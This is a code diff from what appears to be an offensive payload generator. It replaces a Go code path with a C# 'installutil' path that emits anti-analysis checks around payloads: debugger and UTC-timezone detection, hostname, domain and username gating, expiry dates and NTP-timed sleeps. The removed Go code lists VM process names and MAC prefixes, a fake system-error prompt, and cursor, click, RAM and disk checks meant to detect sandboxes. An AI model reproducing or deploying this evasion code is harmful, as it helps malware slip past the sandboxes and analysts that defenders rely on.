@@ -839,308 +839,83 @@ def senecas_games(bypass_payload):
         # Return check information
         return check_code, num_tabs_required
 
-    elif bypass_payload.language == 'go':
-        rand_username = bypass_helpers.randomString()
-        rand_error1 = bypass_helpers.randomString()
-        rand_hostname = bypass_helpers.randomString()
-        rand_error2 = bypass_helpers.randomString()
-        rand_processor = bypass_helpers.randomString()
-        rand_domain = bypass_helpers.randomString()
+    elif bypass_payload.language == 'installutil':
+        if bypass_payload.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":
 
-        if bypass_payload.required_options["USERNAME"][0].lower() != "x":
-            check_code += rand_username + ", " + rand_error1 + " := user.Current()\n"
-            check_code += "if " + rand_error1 + " != nil {\n"
-            check_code += "os.Exit(1)}\n"
-            check_code += "if strings.Contains(strings.ToLower(" + rand_username + ".Username), strings.ToLower(\"" + bypass_payload.required_options["USERNAME"][0] + "\")) {\n"
+            RandToday = bypass_helpers.randomString()
+            RandExpire = bypass_helpers.randomString()
+
+            # Create Payload code
+            check_code += '\t' * num_tabs_required + 'DateTime {} = DateTime.Today;\n'.format(RandToday)
+            check_code += '\t' * num_tabs_required + 'DateTime {} = {}.AddDays({});\n'.format(RandExpire, RandToday, bypass_payload.required_options["EXPIRE_PAYLOAD"][0])
+            check_code += '\t' * num_tabs_required + 'if ({} < {}) {{\n'.format(RandExpire, RandToday)
+
+            # Add a tab for this check
             num_tabs_required += 1
 
         if bypass_payload.required_options["HOSTNAME"][0].lower() != "x":
-            check_code += rand_hostname + ", " + rand_error2 + " := os.Hostname()\n"
-            check_code += "if " + rand_error2 + " != nil {\n"
-            check_code += "os.Exit(1)}\n"
-            check_code += "if strings.Contains(strings.ToLower(" + rand_hostname + "), strings.ToLower(\"" + bypass_payload.required_options["HOSTNAME"][0] + "\")) {\n"
+
+            check_code += '\t' * num_tabs_required + 'if (System.Environment.MachineName.ToLower().Contains("{}")) {{\n'.format(bypass_payload.required_options["HOSTNAME"][0].lower())
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
+        if bypass_payload.required_options["TIMEZONE"][0].lower() != 'x':
+
+            check_code += '\t' * num_tabs_required + 'if (TimeZone.CurrentTimeZone.StandardName != "Coordinated Universal Time") {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
+        if bypass_payload.required_options["DEBUGGER"][0].lower() != 'x':
+
+            check_code += '\t' * num_tabs_required + 'if (!System.Diagnostics.Debugger.IsAttached) {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
+        #if bypass_payload.required_options["BADMACS"][0].lower() != 'x':
+        #    pass
+
+        if bypass_payload.required_options["DOMAIN"][0].lower() != "x":
+
+            check_code += '\t' * num_tabs_required + 'if (string.Equals("' + bypass_payload.required_options["DOMAIN"][0] + '", System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName, StringComparison.CurrentCultureIgnoreCase)) {\n'
+
+            # Add a tab for this check
             num_tabs_required += 1
 
         if bypass_payload.required_options["PROCESSORS"][0].lower() != "x":
-            check_code += rand_processor + " := runtime.NumCPU()\n"
-            check_code += "if " + rand_processor + " >= " + bypass_payload.required_options["PROCESSORS"][0] + " {\n"
+
+            check_code += '\t' * num_tabs_required + 'if (System.Environment.ProcessorCount >= {}) {{\n'.format(bypass_payload.required_options["PROCESSORS"][0])
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
+        if bypass_payload.required_options["USERNAME"][0].lower() != "x":
+
+            rand_user_name = bypass_helpers.randomString()
+            rand_char_name = bypass_helpers.randomString()
+            check_code += '\t' * num_tabs_required + 'string {} = System.Security.Principal.WindowsIdentity.GetCurrent().Name;\n'.format(rand_user_name)
+            check_code += '\t' * num_tabs_required + "string[] {} = {}.Split('\\\\');\n".format(rand_char_name, rand_user_name)
+            check_code += '\t' * num_tabs_required + 'if ({}[1].Contains("{}")) {{\n\n'.format(rand_char_name, bypass_payload.required_options["USERNAME"][0])
+
+            # Add a tab for this check
             num_tabs_required += 1
 
         if bypass_payload.required_options["SLEEP"][0].lower() != "x":
-            check_code += 'type ntp_struct struct {FirstByte,A,B,C uint8;D,E,F uint32;G,H uint64;ReceiveTime uint64;J uint64}\n'
-            check_code += 'sock,_ := net.Dial("udp", "us.pool.ntp.org:123");sock.SetDeadline(time.Now().Add((6*time.Second)));defer sock.Close()\n'
-            check_code += 'ntp_transmit := new(ntp_struct);ntp_transmit.FirstByte=0x1b\n'
-            check_code += 'binary.Write(sock, binary.BigEndian, ntp_transmit);binary.Read(sock, binary.BigEndian, ntp_transmit)\n'
-            check_code += 'val := time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((ntp_transmit.ReceiveTime >> 32)*1000000000)))\n'
-            check_code += 'time.Sleep(time.Duration(' + bypass_payload.required_options["SLEEP"][0] + '*1000) * time.Millisecond)\n'
-            check_code += 'newsock,_ := net.Dial("udp", "us.pool.ntp.org:123");newsock.SetDeadline(time.Now().Add((6*time.Second)));defer newsock.Close()\n'
-            check_code += 'second_transmit := new(ntp_struct);second_transmit.FirstByte=0x1b\n'
-            check_code += 'binary.Write(newsock, binary.BigEndian, second_transmit);binary.Read(newsock, binary.BigEndian, second_transmit)\n'
-            check_code += 'if int(time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((second_transmit.ReceiveTime >> 32)*1000000000))).Sub(val).Seconds()) >= ' + bypass_payload.required_options["SLEEP"][0] + ' {'
-            num_tabs_required += 1
 
-        if bypass_payload.required_options["UTCCHECK"][0].lower() != "false":
+            check_code += '\t' * num_tabs_required + 'var NTPTransmit = new byte[48];NTPTransmit[0] = 0x1B; var secondTransmit = new byte[48]; secondTransmit[0] = 0x1B;  var skip = false;\n'
+            check_code += '\t' * num_tabs_required + 'var addr = Dns.GetHostEntry("us.pool.ntp.org").AddressList;var sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
+            check_code += '\t' * num_tabs_required + 'try { sock.Connect(new IPEndPoint(addr[0], 123)); sock.ReceiveTimeout = 6000; sock.Send(NTPTransmit); sock.Receive(NTPTransmit); sock.Close(); } catch { skip = true; }\n'
+            check_code += '\t' * num_tabs_required + 'ulong runTotal=0;for (int i=40; i<=43; ++i){runTotal = runTotal * 256 + (uint)NTPTransmit[i];}\n'
+            check_code += '\t' * num_tabs_required + 'var t1 = (new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * runTotal);\n'
+            check_code += '\t' * num_tabs_required + 'Thread.Sleep(' + bypass_payload.required_options["SLEEP"][0] + '*1000);\n'
+            check_code += '\t' * num_tabs_required + 'var newSock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);\n'
+            check_code += '\t' * num_tabs_required + 'try { var addr2 = Dns.GetHostEntry("us.pool.ntp.org").AddressList; newSock.Connect(new IPEndPoint(addr2[0], 123)); newSock.ReceiveTimeout = 6000; newSock.Send(secondTransmit); newSock.Receive(secondTransmit); newSock.Close(); } catch { skip = true; }\n'
+            check_code += '\t' * num_tabs_required + 'ulong secondTotal = 0; for (int i = 40; i <= 43; ++i) { secondTotal = secondTotal * 256 + (uint)secondTransmit[i]; }\n'
+            check_code += '\t' * num_tabs_required + 'if (((new DateTime(1900, 1, 1, 0, 0, 0, DateTimeKind.Utc)).AddMilliseconds(1000 * secondTotal) - t1).Seconds >= ' + bypass_payload.required_options["SLEEP"][0] + ' || skip) {\n'
 
-            tzone_abbrev = bypass_helpers.randomString()
-            tzone_offset = bypass_helpers.randomString()
-
-            check_code += '_, ' + tzone_offset + ' := time.Now().Zone()\n'
-            check_code += 'if ' + tzone_offset + ' != 0 {\n'
-            num_tabs_required += 1
-
-        if bypass_payload.required_options["USERPROMPT"][0].lower() != "false":
-
-            title_box = bypass_helpers.randomString()
-            message_box = bypass_helpers.randomString()
-            user32_dll = bypass_helpers.randomString()
-            messagebox_w = bypass_helpers.randomString()
-
-            check_code += 'var ' + title_box + ' = "System Error Encountered"\n'
-            check_code += 'var ' + message_box + ' = "System error 0x831d83a4 - Press OK to continue"\n'
-            check_code += 'var ' + user32_dll + ' = syscall.NewLazyDLL("user32.dll")\n'
-            check_code += 'var ' + messagebox_w + ' = ' + user32_dll + '.NewProc("MessageBoxW")\n'
-            check_code += messagebox_w + '.Call(0,\n'
-            check_code += '\tuintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(' + message_box + '))),\n'
-            check_code += '\tuintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(' + title_box + '))),\n'
-            check_code += '0)\n'
-            check_code += 'if true {\n'
-            num_tabs_required += 1
-
-        if bypass_payload.required_options["RAMCHECK"][0].lower() != 'false':
-
-            memstatusx = bypass_helpers.randomString()
-            kernel32_dll = bypass_helpers.randomString()
-            globalmem_status = bypass_helpers.randomString()
-            mem_info = bypass_helpers.randomString()
-
-            check_code += 'type ' + memstatusx + ' struct {\n'
-            check_code += '\tdwLength\tuint32\n'
-            check_code += '\tdwMemoryLoad\tuint32\n'
-            check_code += '\tullTotalPhys\tuint64\n'
-            check_code += '\tullAvailPhys\tuint64\n'
-            check_code += '\tullTotalPageFile\tuint64\n'
-            check_code += '\tullAvailPageFile\tuint64\n'
-            check_code += '\tullTotalVirtual\tuint64\n'
-            check_code += '\tullAvailVirtual\tuint64\n'
-            check_code += '\tullAvailExtendedVirtual\tuint64\n'
-            check_code += '}\n'
-            check_code += 'var ' + kernel32_dll + ' = syscall.NewLazyDLL("kernel32.dll")\n'
-            check_code += 'var ' + globalmem_status + ' = ' + kernel32_dll + '.NewProc("GlobalMemoryStatusEx")\n'
-            check_code += 'var ' + mem_info + ' ' + memstatusx + '\n'
-            check_code += mem_info + '.dwLength = uint32(unsafe.Sizeof(' + mem_info + '))\n'
-            check_code += globalmem_status + '.Call(uintptr(unsafe.Pointer(&' + mem_info + ')))\n'
-            check_code += 'if (' + mem_info + '.ullTotalPhys/1073741824 >= 3) {\n'
-            num_tabs_required += 1
-
-        if bypass_payload.required_options["PROCCHECK"][0].lower() != 'false':
-
-            kernel32 = bypass_helpers.randomString()
-            createtoolhelp = bypass_helpers.randomString()
-            proc32first = bypass_helpers.randomString()
-            proc32next = bypass_helpers.randomString()
-            closehandle = bypass_helpers.randomString()
-            procentry32 = bypass_helpers.randomString()
-            ev_of_sandbox = bypass_helpers.randomString()
-            sbox_procs = bypass_helpers.randomString()
-            hproc_snap = bypass_helpers.randomString()
-            exe_names = bypass_helpers.randomString()
-            pe32 = bypass_helpers.randomString()
-            ret_val = bypass_helpers.randomString()
-            exe = bypass_helpers.randomString()
-            sbox_process = bypass_helpers.randomString()
-
-            check_code += 'var ' + kernel32 + ' = syscall.NewLazyDLL("kernel32.dll")\n'
-            check_code += 'var ' + createtoolhelp + ' = ' + kernel32 + '.NewProc("CreateToolhelp32Snapshot")\n'
-            check_code += 'var ' + proc32first + ' = ' + kernel32 + '.NewProc("Process32FirstW")\n'
-            check_code += 'var ' + proc32next + ' = ' + kernel32 + '.NewProc("Process32NextW")\n'
-            check_code += 'var ' + closehandle + ' = ' + kernel32 + '.NewProc("CloseHandle")\n'
-            check_code += 'type ' + procentry32 + ' struct {\n'
-            check_code += '\tdwSize\t\tuint32\n'
-            check_code += '\tcntUsage\t\tuint32\n'
-            check_code += '\tth32ProcessID\t\tuint32\n'
-            check_code += '\tth32DefaultHeapID\t\tuintptr\n'
-            check_code += '\tth32ModuleID\t\tuint32\n'
-            check_code += '\tcntThreads\t\tuint32\n'
-            check_code += '\tth32ParentProcessID\t\tuint32\n'
-            check_code += '\tpcPriClassBase\t\tint32\n'
-            check_code += '\tdwFlags\t\tuint32\n'
-            check_code += '\tszExeFile\t\t[260]uint16\n'
-            check_code += '}\n'
-            check_code += ev_of_sandbox + ' := make([]string, 0)\n'
-            check_code += sbox_procs + " := [...]string{`vmsrvc`, `tcpview`, `wireshark`, `visual basic`, `fiddler`, `vmware`, `vbox`, `process explorer`, `autoit`, `vboxtray`, `vmtools`, `vmrawdsk`, `vmusbmouse`, `vmvss`, `vmscsi`, `vmxnet`, `vmx_svga`, `vmmemctl`, `df5serv`, `vboxservice`, `vmhgfs`}\n"
-            check_code += hproc_snap + ', _, _ := ' + createtoolhelp + '.Call(2,0)\n'
-            check_code += 'defer ' + closehandle + '.Call(' + hproc_snap + ')\n'
-            check_code += exe_names + ' := make([]string, 0, 100)\n'
-            check_code += 'var ' + pe32 + ' ' + procentry32 + '\n'
-            check_code += pe32 + '.dwSize = uint32(unsafe.Sizeof(' + pe32 + '))\n'
-            check_code += proc32first + '.Call(' + hproc_snap + ', uintptr(unsafe.Pointer(&' + pe32 + ')))\n'
-            check_code += 'for {\n'
-            check_code += '\t' + exe_names + ' = append(' + exe_names + ', syscall.UTF16ToString(' + pe32 + '.szExeFile[:260]))\n'
-            check_code += '\t' + ret_val + ', _, _ := ' + proc32next + '.Call(' + hproc_snap + ', uintptr(unsafe.Pointer(&' + pe32 + ')))\n'
-            check_code += '\tif ' + ret_val + ' == 0 {\n'
-            check_code += '\t\tbreak\n'
-            check_code += '\t}\n'
-            check_code += '}\n'
-            check_code += 'for _, ' + exe + ' := range ' + exe_names + ' {\n'
-            check_code += '\tfor _, ' + sbox_process + ' := range ' + sbox_procs + ' {\n'
-            check_code += '\t\tif (strings.Contains(strings.ToLower(' + exe + '), strings.ToLower(' + sbox_process + '))) {\n'
-            check_code += '\t\t\t' + ev_of_sandbox + ' = append(' + ev_of_sandbox + ', ' + exe + ')\n'
-            check_code += '\t\t}\n'
-            check_code += '\t}\n'
-            check_code += '}\n'
-            check_code += 'if len(' + ev_of_sandbox + ') == 0 {\n'
-            num_tabs_required += 1
-
-        if bypass_payload.required_options["MINPROCS"][0].lower() != 'x':
-
-            kernel32 = bypass_helpers.randomString()
-            createtoolhelp = bypass_helpers.randomString()
-            proc32first = bypass_helpers.randomString()
-            proc32next = bypass_helpers.randomString()
-            closehandle = bypass_helpers.randomString()
-            min_processes = bypass_helpers.randomString()
-            procentry32 = bypass_helpers.randomString()
-            hproc_snap = bypass_helpers.randomString()
-            exe_names = bypass_helpers.randomString()
-            pe32 = bypass_helpers.randomString()
-            ret_val = bypass_helpers.randomString()
-            exe = bypass_helpers.randomString()
-            count_running_procs = bypass_helpers.randomString()
-            wut = bypass_helpers.randomString()
-
-            check_code += 'var ' + kernel32 + ' = syscall.NewLazyDLL("kernel32.dll")\n'
-            check_code += 'var ' + createtoolhelp + ' = ' + kernel32 + '.NewProc("CreateToolhelp32Snapshot")\n'
-            check_code += 'var ' + proc32first + ' = ' + kernel32 + '.NewProc("Process32FirstW")\n'
-            check_code += 'var ' + proc32next + ' = ' + kernel32 + '.NewProc("Process32NextW")\n'
-            check_code += 'var ' + closehandle + ' = ' + kernel32 + '.NewProc("CloseHandle")\n'
-            check_code += 'type ' + procentry32 + ' struct {\n'
-            check_code += '\tdwSize\t\tuint32\n'
-            check_code += '\tcntUsage\t\tuint32\n'
-            check_code += '\tth32ProcessID\t\tuint32\n'
-            check_code += '\tth32DefaultHeapID\t\tuintptr\n'
-            check_code += '\tth32ModuleID\t\tuint32\n'
-            check_code += '\tcntThreads\t\tuint32\n'
-            check_code += '\tth32ParentProcessID\t\tuint32\n'
-            check_code += '\tpcPriClassBase\t\tint32\n'
-            check_code += '\tdwFlags\t\tuint32\n'
-            check_code += '\tszExeFile\t\t[260]uint16\n'
-            check_code += '}\n'
-            check_code += min_processes + ' := ' + bypass_payload.required_options["MINPROCS"][0] + '\n'
-            check_code += hproc_snap + ', _, _ := ' + createtoolhelp + '.Call(2,0)\n'
-            check_code += 'defer ' + closehandle + '.Call(' + hproc_snap + ')\n'
-            check_code += exe_names + ' := make([]string, 0, 100)\n'
-            check_code += 'var ' + pe32 + ' ' + procentry32 + '\n'
-            check_code += pe32 + '.dwSize = uint32(unsafe.Sizeof(' + pe32 + '))\n'
-            check_code += proc32first + '.Call(' + hproc_snap + ', uintptr(unsafe.Pointer(&' + pe32 + ')))\n'
-            check_code += 'for {\n'
-            check_code += '\t' + exe_names + ' = append(' + exe_names + ', syscall.UTF16ToString(' + pe32 + '.szExeFile[:260]))\n'
-            check_code += '\t' + ret_val + ', _, _ := ' + proc32next + '.Call(' + hproc_snap + ', uintptr(unsafe.Pointer(&' + pe32 + ')))\n'
-            check_code += '\tif ' + ret_val + ' == 0 {\n'
-            check_code += '\t\tbreak\n'
-            check_code += '\t}\n'
-            check_code += '}\n'
-            check_code += count_running_procs + ' := 0\n'
-            check_code += 'for _, ' + exe + ' := range ' + exe_names + ' {\n'
-            check_code += "\tif " + exe + " == \"\" {\n"
-            check_code += "\t\tos.Exit(1)}\n"
-            check_code += '\t' + count_running_procs + ' += 1\n'
-            check_code += '}\n'
-            check_code += 'if (' + count_running_procs + ' >= ' + min_processes + ') {\n'
-            num_tabs_required += 1
-
-        if bypass_payload.required_options["BADMACS"][0].lower() != 'false':
-
-            evd_sandbox = bypass_helpers.randomString()
-            bad_addrs = bypass_helpers.randomString()
-            nics = bypass_helpers.randomString()
-            single_nic = bypass_helpers.randomString()
-            bad_mac = bypass_helpers.randomString()
-
-            check_code += evd_sandbox + ' := make([]net.HardwareAddr, 0)\n'
-            check_code += bad_addrs + ' := [...]string{`00:0C:29`, `00:1C:14`, `00:50:56`, `00:05:69`, `08:00:27`}\n'
-            check_code += nics + ', _ := net.Interfaces()\n'
-            check_code += 'for _, ' + single_nic + ' := range ' + nics + ' {\n'
-            check_code += '\tfor _, ' + bad_mac + ' := range ' + bad_addrs + ' {\n'
-            check_code += '\t\tif strings.Contains(strings.ToLower(' + single_nic + '.HardwareAddr.String()), strings.ToLower(' + bad_mac + ')) {\n'
-            check_code += '\t\t\t' + evd_sandbox + ' = append(' + evd_sandbox + ', ' + single_nic + '.HardwareAddr)\n'
-            check_code += '\t\t}\n'
-            check_code += '\t}\n'
-            check_code += '}\n'
-            check_code += 'if len(' + evd_sandbox + ') == 0 {\n'
-            num_tabs_required += 1
-
-        if bypass_payload.required_options["CLICKTRACK"][0].lower() != 'x':
-
-            usr32 = bypass_helpers.randomString()
-            getkey_state = bypass_helpers.randomString()
-            counter = bypass_helpers.randomString()
-            min_clicks = bypass_helpers.randomString()
-            lft_click = bypass_helpers.randomString()
-            rght_click = bypass_helpers.randomString()
-
-            check_code += 'var ' + usr32 + ' = syscall.NewLazyDLL("user32.dll")\n'
-            check_code += 'var ' + getkey_state + ' = ' + usr32 + '.NewProc("GetAsyncKeyState")\n'
-            check_code += 'var ' + counter + ' = 0\n'
-            check_code += 'var ' + min_clicks + ' = ' + bypass_payload.required_options["CLICKTRACK"][0] + '\n'
-            check_code += 'for ' + counter + ' < ' + min_clicks + ' {\n'
-            check_code += '\t' + lft_click + ', _, _ := ' + getkey_state + '.Call(uintptr(0x1))\n'
-            check_code += '\t' + rght_click + ', _, _ := ' + getkey_state + '.Call(uintptr(0x2))\n'
-            check_code += '\tif ' + lft_click + ' % 2 == 1 {\n'
-            check_code += '\t\t' + counter + ' += 1\n'
-            check_code += '\t}\n'
-            check_code += '\tif ' + rght_click + ' % 2 == 1 {\n'
-            check_code += '\t\t' + counter + ' += 1\n'
-            check_code += '\t}\n'
-            check_code += '}\n'
-            check_code += 'if true {\n'
-            num_tabs_required += 1
-
-        if bypass_payload.required_options["CURSORCHECK"][0].lower() != 'false':
-
-            usr32 = bypass_helpers.randomString()
-            cursor_position = bypass_helpers.randomString()
-            point_struct = bypass_helpers.randomString()
-            secs = bypass_helpers.randomString()
-            point_var1 = bypass_helpers.randomString()
-            point_var2 = bypass_helpers.randomString()
-
-            check_code += 'type ' + point_struct + ' struct {\n'
-            check_code += '\tx, y int32\n'
-            check_code += '}\n'
-            check_code += 'var ' + usr32 + ' = syscall.NewLazyDLL("user32.dll")\n'
-            check_code += 'var ' + cursor_position + ' = ' + usr32 + '.NewProc("GetCursorPos")\n'
-            check_code += secs + ' := 60\n'
-            check_code += point_var1 + ' := ' + point_struct + '{}\n'
-            check_code += cursor_position + '.Call(uintptr(unsafe.Pointer(&' + point_var1 + ')))\n'
-            check_code += 'time.Sleep(time.Duration(' + secs + ' * 1000)  * time.Millisecond)\n'
-            check_code += point_var2 + ' := ' + point_struct + '{}\n'
-            check_code += cursor_position + '.Call(uintptr(unsafe.Pointer(&' + point_var2 + ')))\n'
-            check_code += 'if ' + point_var1 + '.x - ' + point_var2 + '.x == 0 && ' + point_var1 + '.y - ' + point_var2 + '.y == 0 {\n'
-            num_tabs_required += 1
-
-        if bypass_payload.required_options["DISKSIZE"][0].lower() != 'x':
-
-            min_disk_size = bypass_helpers.randomString()
-            kernel32 = bypass_helpers.randomString()
-            getDiskFreeSpaceEx = bypass_helpers.randomString()
-            lpFreeBytesAvailable = bypass_helpers.randomString()
-            lpTotalNumberOfBytes = bypass_helpers.randomString()
-            lpTotalNumberOfFreeBytes = bypass_helpers.randomString()
-            cur_disk_size = bypass_helpers.randomString()
-
-            check_code += min_disk_size + ' := float32(' + bypass_payload.required_options["DISKSIZE"][0] + ')\n'
-            check_code += 'var ' + kernel32 + ' = syscall.NewLazyDLL("kernel32.dll")\n'
-            check_code += 'var ' + getDiskFreeSpaceEx + ' = ' + kernel32 + '.NewProc("GetDiskFreeSpaceExW")\n'
-            check_code += lpFreeBytesAvailable + ' := int64(0)\n'
-            check_code += '\t' + lpTotalNumberOfBytes + ' := int64(0)\n'
-            check_code += '\t' + lpTotalNumberOfFreeBytes + ' := int64(0)\n'
-            check_code += getDiskFreeSpaceEx + '.Call(\n'
-            check_code += '\tuintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("C:"))),\n'
-            check_code += '\tuintptr(unsafe.Pointer(&' + lpFreeBytesAvailable + ')),\n'
-            check_code += '\tuintptr(unsafe.Pointer(&' + lpTotalNumberOfBytes + ')),\n'
-            check_code += '\tuintptr(unsafe.Pointer(&' + lpTotalNumberOfFreeBytes + ')))\n'
-            check_code += cur_disk_size + ' := float32(' + lpTotalNumberOfBytes + ')/1073741824\n'
-            check_code += 'if (' + cur_disk_size + ' > ' + min_disk_size + ') {\n'
+            # Add a tab for this check
             num_tabs_required += 1
 
         # Return check information
